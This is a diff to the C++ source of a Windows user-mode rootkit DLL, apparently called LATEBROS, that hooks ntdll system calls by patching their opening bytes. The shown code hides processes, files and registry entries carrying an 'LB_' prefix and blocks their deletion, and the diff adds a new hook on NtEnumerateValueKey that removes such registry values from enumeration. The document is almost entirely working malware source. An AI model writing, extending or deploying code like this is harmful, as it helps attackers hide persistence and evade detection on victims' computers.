@@ -1,9 +1,6 @@
 ﻿#include "stdafx.h"
 #include "detour.hpp"
-#include <fstream>
 #define ROOTKIT_PREFIX L"LB_"
-
-
 
 /*
  * Function: ntdll!NtOpenProcess
@@ -65,7 +62,7 @@ extern "C" NTSTATUS __declspec(dllexport) WINAPI qsi(SYSTEM_INFORMATION_CLASS sy
 	// PREVENT BRUTEFORCE
 	if (system_information_class == static_cast<_SYSTEM_INFORMATION_CLASS>(0x58)/*SystemProcessIdInformation*/)
 	{
-		auto process_id = *reinterpret_cast<uint64_t*>(system_information);
+		auto process_id = *static_cast<uint64_t*>(system_information);
 
 		// REMOVE HOOKS IN CASE PROCESS ID IS PROTECTED
 		auto function_pointer = reinterpret_cast<uintptr_t>(GetProcAddress(GetModuleHandleA("ntdll"), "NtOpenProcess"));
@@ -231,7 +228,7 @@ extern "C" NTSTATUS __declspec(dllexport) NTAPI ntqdf(HANDLE file_handle, HANDLE
 		// SO I HAD TO FIND THE IMPORTANT MEMBERS MYSELF
 		if (file_information_class == 37/*FileOleDirectoryInformation*/)
 		{
-			auto current_entry = reinterpret_cast<FILE_OLE_DIR_INFORMATION*>(file_information);
+			auto current_entry = static_cast<FILE_OLE_DIR_INFORMATION*>(file_information);
 			auto previous_entry = current_entry;
 
 			while (current_entry->next_entry_offset)
@@ -251,7 +248,6 @@ extern "C" NTSTATUS __declspec(dllexport) NTAPI ntqdf(HANDLE file_handle, HANDLE
 	return result;
 }
 
-
 /*
 * Function: ntdll!NtDeleteValueKey
 * Purpose: Protect any LATEBROS registry value from being deleted
@@ -260,7 +256,7 @@ extern "C" NTSTATUS __declspec(dllexport) NTAPI ntqdf(HANDLE file_handle, HANDLE
 extern "C" char __declspec(dllexport) ntdvk_og[0xF] = {}; // ORIGINAL BYTES
 extern "C" NTSTATUS __declspec(dllexport) NTAPI ntdvk(HANDLE key_handle, PUNICODE_STRING value_name)
 {
-	std::wstring name(value_name->Buffer, value_name->Length / sizeof(WCHAR));
+	std::wstring name(value_name->Buffer, value_name->Length / sizeof(wchar_t));
 	if (name.find(ROOTKIT_PREFIX) != std::wstring::npos) // PROTECTED ENTRY
 		return STATUS_OBJECT_NAME_NOT_FOUND;
 
@@ -274,6 +270,74 @@ extern "C" NTSTATUS __declspec(dllexport) NTAPI ntdvk(HANDLE key_handle, PUNICOD
 
 	// REHOOK
 	detour::hook_function(function_pointer, reinterpret_cast<uintptr_t>(ntdvk));
+
+	return result;
+}
+
+/*
+* Function: ntdll!NtEnumerateValueKey
+* Purpose: hide any LATEBROS registry value from enumeration
+*
+*/
+enum KEY_VALUE_INFORMATION_CLASS {
+	KeyValueBasicInformation = 0,
+	KeyValueFullInformation,
+	KeyValuePartialInformation,
+	KeyValueFullInformationAlign64,
+	KeyValuePartialInformationAlign64,
+	MaxKeyValueInfoClass
+};
+struct KEY_VALUE_BASIC_INFORMATION {
+	ULONG TitleIndex;
+	ULONG Type;
+	ULONG NameLength;
+	WCHAR Name[1];
+};
+struct KEY_VALUE_FULL_INFORMATION {
+	ULONG TitleIndex;
+	ULONG Type;
+	ULONG DataOffset;
+	ULONG DataLength;
+	ULONG NameLength;
+	WCHAR Name[1];
+};
+extern "C" char __declspec(dllexport) ntevk_og[0xF] = {}; // ORIGINAL BYTES
+extern "C" NTSTATUS __declspec(dllexport) NTAPI ntevk(HANDLE key_handle, ULONG index, KEY_VALUE_INFORMATION_CLASS key_value_class, PVOID key_value_info, ULONG length, PULONG return_length)
+{
+	auto function_pointer = reinterpret_cast<uintptr_t>(GetProcAddress(GetModuleHandleA("ntdll"), "NtEnumerateValueKey"));
+
+	// RESTORE
+	detour::remove_detour(function_pointer, ntevk_og, sizeof(ntevk_og));
+
+	// CALL	
+	auto result = reinterpret_cast<decltype(ntevk)*>(function_pointer)(key_handle, index, key_value_class, key_value_info, length, return_length);
+
+	// REHOOK
+	detour::hook_function(function_pointer, reinterpret_cast<uintptr_t>(ntevk));
+
+	// DON'T MODIFY ON FAILURE
+	if (result != STATUS_SUCCESS)
+		return result;
+
+	// FETCH REGISTRY KEY NAME
+	std::wstring name;
+	if (key_value_class == KEY_VALUE_INFORMATION_CLASS::KeyValueFullInformation)
+	{
+		auto data = static_cast<KEY_VALUE_FULL_INFORMATION*>(key_value_info);
+		name = std::wstring(data->Name, data->NameLength / sizeof(wchar_t));
+	}
+	else if (key_value_class == KEY_VALUE_INFORMATION_CLASS::KeyValueBasicInformation)
+	{
+		auto data = static_cast<KEY_VALUE_BASIC_INFORMATION*>(key_value_info);
+		name = std::wstring(data->Name, data->NameLength / sizeof(wchar_t));
+	}
+
+	// HIDE ANY PROTECTED ENTRIES
+	if (name.find(ROOTKIT_PREFIX) != std::wstring::npos)
+	{
+		ZeroMemory(key_value_info, *return_length);
+		return STATUS_INVALID_PARAMETER;
+	}
 
 	return result;
 }
